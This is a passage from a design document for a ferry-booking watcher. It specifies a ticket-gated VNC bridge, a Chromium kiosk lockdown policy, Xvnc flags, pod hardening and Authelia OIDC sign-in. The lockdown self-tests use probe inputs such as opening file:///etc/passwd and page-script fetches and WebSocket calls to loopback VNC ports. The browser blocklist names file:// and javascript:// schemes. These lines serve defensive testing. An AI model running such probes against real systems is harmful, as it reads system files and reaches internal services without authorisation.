as a sign-in window before any cart (§15), would be a new audience with its own condition and no `cart_id`
(`vnc_mints.cart_id` is nullable for that reason): an addition, not a change to the checkout path.

`disp` is decoded but not trusted by the landing page, which shows it with `textContent` only. At first
connect the landing page stores `session deadline = now + session_s` with `N` and shows "Checkout closes at
hh:mm (paused while you're on the payment page)" and the hard deadline.

**Upgrade checks, all required, in order:**
1. `Origin == FW_VNC_ORIGIN` (`https://ferry-checkout.chestr.dev`). Page JS in the pod's own Chromium cannot pass
   this (its Origin is bcferries.com).
2. `lockdown_ok`, not draining, `vnc_allowed`, and, for the `fw-vnc` audience (the only one in v1), a local
   cart READY with every hold clock still running.
3. Either:
   - **first connect:** the lock is unset and the subprotocols contain `fw.t1.<ticket>` and `fw.n1.<N>`. The
     ticket must verify against one of `FW_VNC_PUBKEYS` with the right `aud`, an unexpired `exp`, and
     `trip == FW_TRIP_ID`, `pod == FW_POD_NAME`, `sub == FW_OWNER`, `cart_id ==` the local READY cart, and an
     unused `jti` (cached for the pod's lifetime). The "lock unset" check, the `jti` record and
     `lock = sha256(N)` happen in one synchronous block with no `await` between them, so two simultaneous
     first viewers cannot both win.
   - **reconnect:** the lock is set and `sha256(N) == lock`. If a viewer socket is still open (a stale socket
     after a network change), the gate closes it and its Xvnc connection first. Tickets are ignored once the
     lock is set.
4. The response selects subprotocol `binary`. The gate opens `/tmp/kasm/rfb.sock` and bridges WebSocket
   binary frames to raw RFB bytes in both directions. If S-KIOSK shows the unix-socket path is unworkable,
   the fallback is Xvnc's WebSocket on `127.0.0.1:6081` behind a per-boot BasicAuth credential that only the
   gate knows, with self-tests 2-3 (§5.6) as blocking checks.

**Liveness:** the gate sends a WebSocket ping every 20 s; a missed pong closes the viewer socket and starts
the viewer-gone clock. This also keeps Cloudflare's idle timer (reportedly about 100 s for WebSockets on
non-Enterprise plans; medium confidence) from closing a socket while the user reads a static page.

**Locks and limits:**
- The lock is per `cart_id` and dies with the pod.
- `N` lives in localStorage on the `ferry-checkout.chestr.dev` origin, keyed by `(trip, gen)`, so a reload or a
  return from the dashboard with a fresh ticket reuses it. ferry-web never sees it.
- A device that loses `N` (cleared storage, a different browser context) cannot rejoin by design (C11), and
  the hold ends at viewer-gone. There is no takeover ticket (owner, round 3): if S-VNC-lite or the owner's
  iPhone during M1 shows the iOS home-screen path loses `N`, iPhone users are told to check out in Safari or
  on a computer, and the question is revisited with that data.
- Moving checkout to another device ("continue on another device" QR code) is M4.

**Revocation:** the gate closes the socket on release, any clock expiring, `vnc_revoke`, suspend or drain.
After a viewed hold the pod exits.

**Rate and usage:** viewer seconds are reported in `state` and charged to `vncMinutesPerDay`. The gate
refuses more than 5 *failed* upgrade attempts per minute; successful reconnects are not counted.
*As built* (`src/ferry_watch/agent/gate.py`): only step-3 failures count (a bad or missing ticket or nonce),
and the limit holds back first connects only. A reconnect with the right nonce is always let in, so a burst of
bad attempts can't lock the owner out of a checkout they already opened. Refusals send a bare status code
(403, 409, 429, 502) and log the reason locally.

**Why there is no gateway-level auth on the VNC host:** Envoy checks only the upgrade, and SNAT makes headers
unprovable at the pod. A second IdP session on the VNC origin is also fragile in iOS home-screen apps, which
have a separate cookie jar. An IdP-asserted principal that the pod verifies itself is the M4 upgrade path
(S-VNCID), not a header.

### 5.6 Lockdown

**Chromium managed policy** is baked into the image, root-owned and read-only, in
`/etc/chromium/policies/managed`, `/etc/opt/chrome_for_testing/policies/managed` and
`/etc/opt/chrome/policies/managed`, so the Playwright 1.57 switch to Chrome for Testing cannot silently drop
it [R:limits-browser-lockdown §b]. Settings:
- `URLBlocklist: ["*","chrome://*","chrome-untrusted://*","devtools://*","view-source:*","file://*","javascript://*","localhost","127.0.0.1","[::1]"]`
  plus `URLAllowlist: ["about:blank","https://*"]`. **Which hosts a pod can reach is decided by the network
  policy, not by Chromium** (round 3): outside holds only bcferries.com and Queue-it resolve and connect; while
  a cart is held any public HTTPS host does, so any bank's 3DS page loads (C20, §7.6). The baked-in policy
  therefore cannot change with the hold, and it doesn't need to: it blocks every non-HTTPS scheme, browser
  internals and loopback names (the more specific host filter wins over `https://*`; confirm in S-KIOSK).
  bcferries.com's `/login` is not blocked; §5.7 advises users not to sign in during checkout. If the owner
  prefers to block it, a `URLBlocklist` entry `bcferries.com/login` is enough (Chromium applies the most
  specific matching filter, so the longer path wins; confirm in S-KIOSK), at the cost of a future account
  mode needing it removed again (an image change, so a two-way door).
  The blocklist covers navigations including subframes, not fetch or WebSocket, which is why C13 does not
  rely on it.
- Incognito, Guest, AddPerson and sign-in off; sync off. `DownloadRestrictions=3`,
  `AllowFileSelectionDialogs=false`, `PrintingEnabled=false`.
- Password manager and address/card autofill off. Extensions blocked.
- `QuicAllowed=false`, `DnsOverHttpsMode=off`, `WebRtcIPHandling=disable_non_proxied_udp`.
- `DiskCacheSize` 32 MiB (with `--disk-cache-size`), because the cache lives in memory-backed `/tmp`.
- No default search provider. Popups only for `[*.]bcferries.com`.
- Notifications, USB, file-system, clipboard API, audio, video and screen capture all denied.
- Local Network Access set to block for all origins (policy names confirmed in S-KIOSK).
- **Never** `RemoteDebuggingAllowed` or `DeveloperToolsAvailability`: both break Playwright's pipe.
  `--kiosk` blocks the DevTools UI instead.

The test-only `agent-e2e` image adds `127.0.0.1` and the fake host to the allowlist. The published image must
not contain that marker, and CI checks this.

**Watchdog:** `context.on("page")` closes any page the agent did not open that is not on bcferries or
Queue-it, with at most 2 extra pages; during a hold it lets up to 2 extra pages on any HTTPS host stay open
(3DS pop-ups). It counts main-frame navigations that leave bcferries.com and Queue-it. During a hold it
watches for `ERR_BLOCKED_BY_ADMINISTRATOR`, `ERR_NAME_NOT_RESOLVED` or a refused connection on any frame and
reports `checkout_host_blocked` (R16).

**Self-tests** run at startup and after any Chromium relaunch (never during a hold), and fail closed
(`lockdown_ok=false`). *As built* (`src/ferry_watch/agent/lockdown.py`, run by `PodBrowser` after every
launch): the TCP check is exact; for unix sockets it requires `rfb.sock` listening with mode 0600 and logs
the others (X11's own socket, Chromium's profile singleton), since `ss -ltnx` would list those too. Check 3
runs its probes from `about:blank`, whose opaque origin fails the gate's Origin check just as bcferries.com's
would, so the self-test costs no request to BC Ferries. The probes run in a fresh tab: under the policy, sending
a tab that shows an error page back to `about:blank` lands on another error page and never loads (found by the
browser image's smoke test, which runs these checks against the real image). Until the first launch, `lockdown_ok` is false, which
is harmless: nothing can cart or open the gate before a check has launched Chromium.
1. `chrome://version`, `file:///etc/passwd` and `view-source:https://www.bcferries.com/` must each fail with
   `ERR_BLOCKED_BY_ADMINISTRATOR`; `https://example.com/` must fail at the network (`ERR_NAME_NOT_RESOLVED`,
   the allowlist egress state).
2. Listeners: TCP exactly `0.0.0.0:6080` and `0.0.0.0:8080`; unix socket `/tmp/kasm/rfb.sock` with mode
   0600; nothing else (`ss -ltnx`).
3. From the first bcferries page, `page.evaluate` tries `fetch("http://127.0.0.1:6081/")`,
   `new WebSocket("ws://127.0.0.1:6081/websockify")`, `new WebSocket("ws://127.0.0.1:6080/ws")` and
   `fetch("https://example.com/")`. None may complete an RFB handshake or load content. The LNA check only
   warns; the listener and egress checks are fatal.

**Xvnc flags** replace `entrypoint.sh:20-26`:
`:99 -geometry 1280x1000 -depth 24 -rfbunixpath /tmp/kasm/rfb.sock -rfbunixmode 0600 -SecurityTypes None
-DisableBasicAuth -NeverShared -DisconnectClients=0 -SendCutText=0 -AcceptCutText=1 -DLP_ClipAcceptMax 256
-IgnoreClientSettingsKasm -FrameRate 15 -MaxVideoResolution 1920x1080 -MaxConnectionTime 6000
-AcceptSetDesktopSize -publicIP 127.0.0.1 -Log *:stderr:10`.

- With `-rfbunixpath` set, KasmVNC creates only the unix listener and no WebSocket or TCP listener
  (upstream `unix/xserver/hw/vnc/vncExtInit.cc:255-290`). That is what makes C13 hold by construction.
- **Kept:** `-DisableBasicAuth`, despite its name. It is the only switch that gives a client with no
  `~/.kasmpasswd` user its rights (`common/rfb/VNCSConnectionST.cxx:1241-1270`). The gate's connection
  arrives on the unix socket with no user, so without it Xvnc takes away its view and input rights
  (`:91-108`) and never sends a frame: the checkout is black and ignores every tap. With `-rfbunixpath`
  there is no WebSocket or HTTP listener, so there is no basic auth to turn off; access stays the socket's
  0600 mode and the gate. Two tests run the real Xvnc with these flags and fail on a black or deaf screen:
  `tests/browser/test_checkout_screen.py` and the browser image's smoke test (`docker/browser/selftest.py`).
- **Removed:** `-AlwaysShared`, `-interface`, `-websocketPort`, `-httpd`, `-sslOnly`,
  `-IdleTimeout` (the gate's ping replaces it; idle-dropping a user who is reading the page only forces a
  reconnect), and `-DLP_KeyRateLimit` (KasmVNC drops any key-down within `1000/limit` ms of the previous key
  event, `common/rfb/VNCSConnectionST.cxx:872-880`, which silently loses characters from phone keyboards).
- **Never** `-MaxIdleTime` or `-MaxDisconnectionTime`. Their clocks start at server start, so they would kill
  pods during normal unattended watching [R:limits-reaping-lifecycle].
- `-MaxConnectionTime 6000` counts from the gate's first connection and resets when it disconnects. It fires
  only if one connection lasts more than 100 min, beyond the compiled 90-min hold, where exiting is desired.
- Never `DLP_Log=verbose`, which would log card keystrokes.

**Pod hardening:**
- PSA `restricted`, read-only root, uid 1001, drop ALL, no SA API token, `enableServiceLinks: false`.
- Memory emptyDirs: `/tmp` 512Mi (profile, capped cache, X socket, RFB socket) and `/dev/shm` 256Mi. Both
  count against the container's memory limit, so `podMemory` covers them (§8.4).
- Seccomp `RuntimeDefault`, and Chromium without its sandbox (R2 explains what that means). If the owner
  applies the optional sandbox hardening (S-SBX, backlog): a `Localhost` profile `profiles/fw-chromium.json`
  (containerd's default plus `clone`/`unshare` with `CLONE_NEWUSER`/`NEWPID`/`NEWNET`, and `chroot`, the
  exact set fixed by S-SBX), together with `chromium_sandbox=True`. Both are VAP-param driven, so turning
  them on is a values change, not a redesign.
- `hostUsers: false` if and when the Talos `user.max_user_namespaces` change is applied. It is independent
  hardening (the pod's root maps to an unprivileged host uid) and needs the same sysctl. The VAP param
  `requireUserNamespace` can make it mandatory later.
- `fluentbit.io/exclude: "true"`.
- `kubernetes.io/egress-bandwidth: 20M`, only if S-CIL shows the bandwidth manager works with netkit.

### 5.7 Credential modes

- **Guest, the only mode at launch, for everyone including the owner** (owner, round 2: accepted "for
  now"). Remove the auto-cart credential gate (`watcher.py:459`, `:562`) and default `auto_cart` to true
  (`views.py:113`). Drop `BCF_USER`/`BCF_PASS` (`settings.py:40-42`) and pass `credentials=None`. Cart alerts
  say "check out as a guest". The guest's contact details and card exist only in the pod's memory during one
  hold, and the pod is destroyed after any viewed hold. **Owner cost:** today the owner's checkout signs in
  for saved payment cards (`site.py:270-271`) and possibly account-only fares; under this plan the owner
  also checks out as a guest.
- **Guest checkout is assumed to work; no spike tests it** (owner, round 2: "No spike for now,
  assume it works and if not we will adjust later, don't make any one way door decisions on this"). What
  the removed spikes (S1, S2, S2b, S5, S6, S7, the live part of S-FIX) would have told us comes instead from:
  - **fixtures captured from the owner's own real use during M1**, the same way the existing fixtures were
    captured (`tests/fixtures/README.md`): the cart and review page, the confirmation page, the page after a
    release (and the empty cart), the login wall or account-required page if it ever appears, an expired
    cart, and a "date beyond the schedule" page. Until a page is captured, its classifier errs safe (§5.2);
  - **production detection** (below), with **hold clocks that keep the plan's defaults** (30 min unclaimed,
    30 min checkout session, 10 min viewer gone, 60 min hard cap) and are tuned from telemetry: the
    checkout-duration histogram replaces S2b, the site-TTL histogram from `cart_expired_by_site` replaces S6;
  - **payment and 3DS pages**: nothing to learn. Public HTTPS egress is open while a cart is held (owner,
    round 3), so BC Ferries' processor (Moneris, with 3-D Secure 2.0 [R:limits-browser-lockdown]) and any
    issuer's 3DS host load without a list; the previous seeded-and-learned allowlist and S-3DS are dropped.
- **Production detection** replaces the spikes:
  - the agent reports any visit to BC Ferries' login page or an account-required page during a checkout as
    `event{checkout_login_seen, forced}`. `forced` is true when the site sent the checkout there: the page
    was reached by an HTTP redirect from a cart, review or payment step, or shows an account-required
    message. A visit the user started (clicking the site's own sign-in link) is `forced: false`. This is
    best effort until a real login wall is captured in a fixture. It also reports a cart the site has
    expired (`cart_expired_by_site`);
  - "Did you book it?" answers carry an optional reason ("the site wanted me to sign in" = `needed_account`,
    "I tried to sign in" = `tried_sign_in`, "payment failed", "checkout broke", "ran out of time", "changed
    my mind"), so a forced login wall can be told from a voluntary sign-in;
  - `ferrywatch_holds_total{outcome}`, `ferrywatch_checkout_login_seen_total{forced}`,
    `ferrywatch_releases_total{check}` and the two histograms (§9.5);
  - a small **hold-outcome record** per viewed or expired hold (day, outcome, answer reason, fare name,
    vehicle type, login seen and forced, release check, checkout seconds; no booking reference), kept 400
    days like audit and usage (§6.4), so the owner can see *which* fare or vehicle types failed before
    choosing the per-type switch below;
  - an admin alert, `guest_checkout_failing`, on the **first** forced login wall or `needed_account` answer
    (at household volume one is enough to act on), and the PrometheusRule `GuestCheckoutFailing` when 2 or
    more viewed holds within 7 days end with a forced login wall or a `needed_account` or `checkout_broke`
    answer (§8.2). Voluntary visits (`forced: false`) and `tried_sign_in` answers are counted but alert
    nobody.
- **If guest checkout fails in production, the adjustment is immediate and reversible:** turn on "Pause
  carting" on the admin Fleet page at once (alert-only: no new holds), then set `autoCart: false` in values
  so it survives restarts. Bookable alerts link to `search_url` on bcferries.com (`site.py:72-87`). If only
  some fare or vehicle types need an account, list them in `alertOnlyFareTypes` / `alertOnlyVehicleTypes`
  (values) instead. The owner's own logged-in checkout is still available from the legacy app, which is kept
  restorable until a real guest checkout has worked on the new stack (§12.5). Then decide on an account
  mode: with stored credentials excluded (decision 1 and "Never" below), the candidate is the attended
  sign-in before a cart (§15), which needs the owner to reopen first-list Q1. **No** pod-served password page under
  any fallback, and no pre-cart VNC window in v1 or as an automatic fallback.
- **Two-way doors, stated explicitly** (nothing in the DB, the protocol or the pod shape assumes guest
  forever):
  1. `SiteSession.login()` (`site.py:270-301`) and `Credentials` stay in the agent package behind a disabled
     flag, with their tests still running in CI (§11.4); they are not deleted (§5.2).
  2. A per-trip `checkout_mode` is reserved in the data model (`trips.checkout_mode`, default `'guest'`, §6.4)
     and the protocol (`configure.checkout_mode`, §5.3), so an account mode is an added value, not a change
     in what existing rows or messages mean.
  3. The fleet-wide `autoCart` kill switch (alert-only) stays, and alert-only can be set per fare or vehicle
     type.
  4. The VAP's env allowlist can admit a future login-mode variable (`FW_CHECKOUT_MODE`) by a params change
     (`optionalEnv`, §7.5), without editing the policy.
  5. The legacy deployment, its PVC and the owner's `BCF_USER`/`BCF_PASS` stay (scaled to zero) until a real
     guest checkout has worked on the new stack, not for a fixed 14 days (§12.5).
  6. The VNC ticket's `aud` names its purpose (§5.5) and C22 is scoped to *checkout* viewers, so a later
     sign-in window is a new audience and a named branch, not a rewrite of the checkout gate.
- **Can users sign in to BC Ferries inside the browser?** (Owner, round 2: "Users can always sign-in on the
  browser?") **Probably not during checkout, and the plan advises against it.** Every VNC session has a held
  guest cart, because VNC exists only while a cart is held, and the owner has observed that BC Ferries'
  login page won't accept a login while a guest cart exists ([top-level README](../../README.md) "Things to
  know about BC Ferries"; `site.py:288-290`, where the site clears the login form). The page is not blocked
  (bcferries.com, including `/login`, is allowlisted, §5.6), so a user can try, but should expect the
  sign-in to fail; whether trying affects the held cart is unverified. There is a security reason too: a
  password typed there crosses the same plaintext path as card data (Cloudflare, cloudflared, Envoy and
  vnc-edge, R4) into a Chromium running without its sandbox (R2), and any BC Ferries account session it
  creates lives on at BC Ferries after the pod exits (the pod itself keeps nothing; the password manager is
  off). So the cart screen (`/c/<trip>`), the checkout landing page, the cart banner and the invite email
  say: "Check out as a guest. Don't sign in to BC Ferries here: it doesn't accept a sign-in while a cart is
  held." Supporting sign-in properly is the attended sign-in option in §15, which comes with the sandbox
  hardening first. If the owner prefers to make the advice a rule, one `URLBlocklist` entry blocks `/login`
  (§5.6).
- **Pre-cart sign-in window: not in v1** (owner, round 2: first-list Q1, "No"). VNC stays strictly gated to a held
  cart. An attended sign-in before a cart (the former M5) is listed as a possible future option in §15. It
  is not designed out (doors 1, 2, 4 and 6 above), but adding it is real work, listed there, and needs the
  owner's explicit decision.
- **Never:** a dashboard password form, an operator-written Secret, per-user credentials in 1Password or ESO,
  or a pod-served credential page. Each puts the plaintext through a component the operator controls
  [R:map-threat-model, R:billing-guest-mode-credentials Q4].

---
## 6. Control plane

### 6.1 Processes and configuration

- One image, `ferry-watch-control` (python:3.12-slim by digest, tzdata, uid 65532, the web build), with
  three entrypoints: `web`, `control` and `migrate`. An all-in-one `dev` entrypoint (web + control in one
  process, signing in through a fake OIDC issuer or the dev header adapter) exists for docker compose only.
- Config comes from a chart ConfigMap and the ExternalSecret. Secrets are mounted only into the process that
  uses them:
  - **web:** ticket private key, VAPID private key, OIDC client id and secret, `ferrywatch_web` password.
  - **control:** `ferrywatch_control` password.
  - **migrate (Job):** the `ferrywatch` owner password (from `ferrywatch-pguser-secret`).
- ferry-control mounts `ferry-control-config`, rendered from the same Helm values as the VAP params
  ConfigMap, so the two cannot drift; a CI check asserts they are equal.
- Probes are `/livez` and `/readyz` on each process's metrics port. web's `readyz` needs the DB; control's
  needs the DB and the apiserver. A control-plane outage never touches pods, because pod readiness is local.
- Each process holds a `pg_try_advisory_lock` (distinct keys), so a second replica idles.

### 6.2 Identity (owner decision 7; round-2 answer "Can we use oidc?")

#### 6.2.1 The question and the answer

Decision 7 asked to start with an authenticating proxy and trusted headers, to keep identity behind an
abstraction that is easy to replace, and not to make any Authelia-only feature load-bearing. The first
revision of this plan followed it with Authelia ext-auth on the dashboard route. In round 2 the owner asked
"Can we use oidc?". **Yes: ferry-web is an OpenID Connect Relying Party of the OIDC provider Authelia already
runs** (issuer `https://auth.chestr.dev`). That is how Immich, Grafana, Paperless, Autobrr and Windmill
sign in on this cluster, and it is the envoy-external convention: external apps do their own auth.

App-native OIDC used to carry one cost here: an app session cookie on `ferry.chestr.dev` meant the route
could no longer drop the whole Cookie header, so the owner's `chestr.dev`-wide `authelia-home-ops` cookie
would reach the app unless it was removed by name (gateway-wide Lua) or the app moved to a separate domain.
**This design sets no cookie at all.** After sign-in, ferry-web issues an opaque bearer token that the SPA
keeps and sends in `Authorization`. The route removes every Cookie header and carries no gateway auth
policy, so there is no Lua, no new domain, and C16 still holds.

The IdP stays replaceable: issuer, client id and secret, scopes and claim names are config, and user ids are
`hash(iss, sub)` with GitOps aliases for a migration (§6.2.6).

#### 6.2.2 Sign-in and the cookie-less session

1. **Start.** The SPA starts sign-in on its own only when the API answers 401 for an expired session or one
   due for re-verification (so a cart alert still lands on `/c/<trip>`). With no token at all, or after an
   explicit sign-out (a "signed out" flag in localStorage), it shows the signed-out screen with one "Sign
   in" button instead (§10); otherwise "Sign out" would silently sign the same person straight back in,
   because their Authelia session and consent are still alive. To sign in, the SPA generates `state` and
   `nonce` (128 bits each) and a PKCE `code_verifier`, and keeps them with the path to return to in
   `sessionStorage`. It reads the public sign-in settings from `GET /auth/config` (authorization endpoint,
   client id, scopes, redirect URI; nothing secret) and sends the whole window to Authelia's authorization
   endpoint with `response_type=code`, `response_mode=fragment`, `code_challenge` (S256), `state`, `nonce`
   and the scopes `openid profile email groups`.
2. **Authelia.** A person without an Authelia session signs in with their password: the client's
   authorization policy is `one_factor` (owner, round 3), so there is no second factor to enrol. It denies
   anyone outside groups `ferry-watch` and `admin` (§6.2.3). The first time,
   Authelia asks for consent with a "remember" choice; after that it doesn't ask.
3. **Callback.** Authelia redirects to `https://ferry.chestr.dev/auth/callback#code=…&state=…`. The
   fragment never reaches a server, so the code never appears in an access log (C15). The SPA route checks
   `state` against sessionStorage (a login-CSRF defence), clears the fragment with `history.replaceState`,
   and POSTs `{code, code_verifier, state, nonce}` as JSON to `/auth/session` (with its current token in
   `Authorization` when it is re-verifying).
4. **Exchange and verify.** ferry-web exchanges the code at the token endpoint with its client secret
   (`client_secret_basic`, Authelia's default for confidential clients) and the verifier. It verifies the
   `id_token`: the header's `alg` must be in a configured allowlist (`[RS256]` by default; `none` and HMAC
   algorithms are always refused, so a token "signed" with the client secret is never accepted), the
   signature against the issuer's JWKS (cached; fetched again once when a `kid` is unknown), `iss` equal to
   the configured issuer, `aud` containing the client id (and `azp` when present), `exp` and `iat` within
   60 s of skew, and `nonce` equal to the posted one. The access token is discarded; the app calls no IdP
   API with it. (v1 has exactly one provider. Before several are allowed, each flow is bound to its provider:
   a per-provider redirect URI plus a provider id kept with `state`, posted, and checked against the
   `id_token`'s `iss`, or the RFC 9207 `iss` response parameter where the IdP sends it; §6.2.6.)
5. **Map and admit.** The uid is computed, never looked up: `h = hash(iss, sub)` and
   `uid = identityAliases.get(h, h)`, from the verified `id_token` and the GitOps ConfigMap only (§6.2.6).
   The `identities` row for `(iss, sub)` is a cache of that uid: if it holds a different one, the sign-in is
   refused and the admin alerted (C23). Then: an active user with that uid is signed in; otherwise an open
   invitation matching the configured claim (`preferred_username` for Authelia, §6.2.7), or a
   `bootstrapAdmins` entry, creates the user with that uid; otherwise the answer is 403 "Your access is being
   set up", no user is created, and the principal (iss, sub, `preferred_username`, `email`, first and last
   seen) is recorded in `unmatched_identities` for 30 days, where the Users page shows it and the alias tool
   can use it. Suspended users get 403. The `groups` claim is stored in `identities.last_groups`. A sign-in
   whose `email` differs from the stored one is flagged on the Users page (R21).
6. **Session.** ferry-web inserts a `sessions` row and returns an opaque 256-bit random token (base64url)
   once; only its SHA-256 is stored. Idle expiry is 7 days and absolute expiry 30 days (§8.2), and the
   session must be **re-verified with the IdP** at least every 24 h (below). The SPA keeps the token in
   `localStorage` on `ferry.chestr.dev` and sends `Authorization: Bearer <token>` on every API call.
7. **Dashboard WebSocket.** `/api/ws` is exempt from the header middleware, because a browser cannot attach
   `Authorization` to an upgrade; first-message auth is mandatory instead. The upgrade passes the usual
   Origin check; the first message must be `{type: "auth", token}` within 5 s. Until then the server sends
   nothing, and a missing or bad token closes the socket with 4401. The token never goes in a URL (C15). The
   socket accepts messages of at most 4 KiB (aiohttp's default is 4 MiB). Each socket records the
   `token_hash` of the session it authenticated with, and is closed when that session is revoked or
   expires for any reason (logout, "sign out everywhere", suspension, idle or absolute expiry, or
   re-verification falling due); the hub re-checks this on every 15 s ping. At most 5 sockets per user,
   each living at most 60 min.

Every `/api/*` route except `/api/ws` requires a valid session of a user in state `active`: 401
(`{reason: expired | reverify | revoked | missing}`) for a missing, unknown, expired, unverified or revoked
token, 403 for a user who is not active. `POST /auth/logout` revokes the current session and closes its
sockets; "Sign out everywhere" on the Account card and admin suspension revoke all of a user's sessions.
Session rows record `iss`, `sub`, creation, last use (written at most every 5 min), last IdP verification and
a coarse client label, so the Account card can list them.

**Re-verification with the IdP (every 24 h).** Authelia applies the client's authorization policy, and
refreshes the user from LDAP, only when the browser comes back to its authorization endpoint (§2.2). So each
session carries `verified_at`, and 24 h after it (`identity.reverifyHours`, 1-24) the API answers 401
`reverify`. The SPA then repeats steps 1-5, sending its current token with the exchange. While the person's
Authelia session lives and they are still allowed, this is a silent redirect (consent is remembered). A
successful exchange for the same uid rotates the token (the old one is revoked), re-reads `groups` and
re-applies `autoApproveGroups`. If Authelia refuses (`access_denied`: no longer in the groups; or the person
was deleted from lldap, which ends their Authelia session at its next LDAP refresh), no new token is issued and the
old one stays unusable until it is purged. Consequences: removal at the IdP reaches the app within 24 h
(R20), a stolen token stops working within 24 h even if nobody notices (R17), and a person without "Remember
me" who was idle for more than 3 days signs in to Authelia again.

**CSRF.** The token travels in a header that browsers never attach on their own, so classic CSRF no longer
applies. The existing Origin and JSON checks on mutations (`server.py:220-229`) stay anyway.

**Egress to the issuer.** ferry-web needs the token endpoint and the JWKS (and discovery once at start).
`auth.chestr.dev` is served by envoy-external (`default/authelia/app/helmrelease.yaml:147-153`) and
resolves to the envoy-external LB address, but under kube-proxy replacement the policy sees the
envoy-external pods on port 10443 (EG shifts privileged ports by 10000). The rule is therefore `toEndpoints`
for `networking` pods labelled `gateway.envoyproxy.io/owning-gateway-name: envoy-external` on TCP 10443, plus
`auth.chestr.dev` in ferry-web's DNS rule (§7.6). S-OIDC confirms both.

#### 6.2.3 The dashboard route and what home-cluster adds

```yaml
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata: {name: ferry-web, namespace: ferry-watch}
spec:
  hostnames: [ferry.chestr.dev]                                # ferry-next.chestr.dev before cutover
  parentRefs: [{name: envoy-external, namespace: networking, sectionName: https}]
  rules:
  - filters:
    - type: RequestHeaderModifier
      requestHeaderModifier:
        remove: [Cookie, Remote-User, Remote-Groups, Remote-Email, Remote-Name]   # every Cookie header, and the
                                                               # dev header adapter's names; Authorization is kept
    backendRefs: [{name: ferry-web, port: 8765}]
```

There is no SecurityPolicy on this route. Browsers still send `authelia-home-ops` (domain `chestr.dev`) to
`ferry.chestr.dev`; the route drops it with every other cookie, so ferry-web never sees it (C16).
`Authorization` is kept because it carries only the app's own bearer token. The `Remote-*` names are removed
too, although production trusts no identity header: if the dev header adapter were ever switched on by
mistake, a client could not supply them through this route. ferry-web sets no cookie, and a CI test asserts it
never sends `Set-Cookie`. gatus may probe the route; it gets the static shell.

home-cluster adds, following its own conventions:
- In `default/authelia/app/resources/configuration.yaml`, under `identity_providers.oidc`:

  ```yaml
  authorization_policies:
    ferry-watch:
      default_policy: deny
      rules:
        - policy: one_factor                                   # owner, round 3: password only
          subject: ['group:ferry-watch', 'group:admin']        # either group
  clients:
    - client_name: Ferry Watch
      client_id: '{{ env "FERRY_WATCH_OAUTH_CLIENT_ID" }}'
      client_secret: '{{ env "FERRY_WATCH_OAUTH_CLIENT_SECRET" }}'   # the argon2 hash, as for every client
      public: false
      require_pkce: true
      pkce_challenge_method: S256
      authorization_policy: ferry-watch
      consent_mode: pre-configured
      pre_configured_consent_duration: 1y
      scopes: [openid, profile, email, groups]
      response_types: [code]
      response_modes: [fragment]
      grant_types: [authorization_code]
      redirect_uris:
        - https://ferry.chestr.dev/auth/callback
        - https://ferry-next.chestr.dev/auth/callback          # removed after cutover (§12.5)
      userinfo_signed_response_alg: none
      claims_policy: default                                   # groups, email, preferred_username, name in the id_token
  ```

- The id, secret and hash generated with the `default/authelia/app/README.md` script (`APP=FERRY_WATCH`)
  and stored in the 1Password item `authelia`; Authelia's ExternalSecret
  (`default/authelia/app/externalsecret.yaml`) gains `FERRY_WATCH_OAUTH_CLIENT_ID` and
  `FERRY_WATCH_OAUTH_CLIENT_SECRET` (from `..._SECRET_HASH`), like every other client.
- ferry-watch's own ExternalSecret reads `FERRY_WATCH_OAUTH_CLIENT_ID` and `FERRY_WATCH_OAUTH_CLIENT_SECRET`
  from the item `authelia`, as `observability/grafana/instance/externalsecret.yaml:20-38` does, alongside its
  ticket and VAPID keys from the item `ferry-watch`. Only the templated keys land in the Secret.
- The lldap group `ferry-watch` (M2, before the first invitee).
- `one_factor` here does not lower anything else: Authelia's session cookie records the level reached, and
  the other clients keep `two_factor` (and gain their own group restrictions, §6.2.9), so an invitee's
  password-only session opens Ferry Watch and nothing more.
- Nothing else: no ReferenceGrant entry, no `access_control` rule for ferry hosts (access-control rules do
  not apply to OIDC authorizations; the client's authorization policy does), no gatus canary.

**Consent.** `pre-configured` with 1 year asks each person once, with a "remember" choice, and never again
while the requested scopes are unchanged. Authelia matches a remembered consent only on identical scopes, so
the SPA always requests the same four. `implicit` would skip even that first screen, but Authelia
discourages it, and one screen per person per year costs little. Refresh tokens are not requested (no
`offline_access`), which would force explicit consent every time.

#### 6.2.4 Re-authentication, sign-out and the iOS home-screen app

- **When the app session lapses or is due for re-verification** (7 days idle, 30 days absolute, 24 h since
  the last IdP verification, §6.2.2), the API answers 401 and the SPA starts step 1 again, remembering the
  current path (for example `/c/<trip>` from a cart alert). While the person's Authelia session is alive (3
  days idle and 7 days total, or 6 months with "Remember me"; `configuration.yaml:32-36`), they are still in
  the client's groups, and their consent is remembered, Authelia sends the browser straight back without
  showing anything, so re-auth is a quick redirect. Authelia 4.39 also supports `prompt=none` (verified
  upstream: it answers `login_required` or `consent_required` instead of showing a page). The SPA does not
  need it, because the plain redirect is already silent when nothing has to be asked, but it is there for
  any check that must never show a page.
- **A revoked session** (logout elsewhere, "sign out everywhere", suspension) also answers 401; the SPA
  starts sign-in only for `expired` and `reverify`, and shows the signed-out screen for `revoked`.
- **Sign-out** revokes the app session, closes its sockets and sets the SPA's "signed out" flag, so the
  next visit shows the signed-out screen rather than a silent sign-in. Signing out of Authelia too is a link
  to Authelia's own logout page; RP-initiated logout is not relied on.
- **The iOS home-screen app** (R18). A web app opened from the Home Screen keeps its own storage, separate
  from Safari. If iOS opens the redirect to Authelia, or the way back, outside the app, the callback cannot
  find the app's `state` and verifier and sign-in fails there. A first sign-in may also leave the app partway
  through, to copy the password from Mail or a password manager (no second-factor step: `one_factor`).
  If iOS evicts the backgrounded app, it relaunches at the manifest's `start_url` (`/`,
  `web/public/manifest.webmanifest`), the in-flight Authelia page is gone, and a sessionStorage-only
  `state` and verifier may be gone too. Whether iOS 16.4+ keeps these navigations inside the app, and how
  long it keeps a backgrounded app alive, is unverified; S-IOS checks both on the owner's iPhone during M1.
  Fallbacks, built only for what S-IOS shows fails:
  - **Lost `state` on return:** keep the pending sign-in (`state`, nonce, verifier, return path) in
    localStorage too, keyed by `state` and expiring after 10 minutes, and accept it at the callback when
    sessionStorage is empty.
  - **Lost Authelia page on relaunch:** the person taps "Sign in" again; the invite email suggests the first
    sign-in in Safari or on a computer, after which signing in from the home-screen app is just the
    password.
  - **Callback outside the app: a handoff code.** The home-screen app starts sign-in through
    `POST /auth/start`, which keeps the verifier and nonce server-side under `state` and returns a random
    app secret. If the callback lands in Safari, ferry-web completes the exchange there and shows a one-time
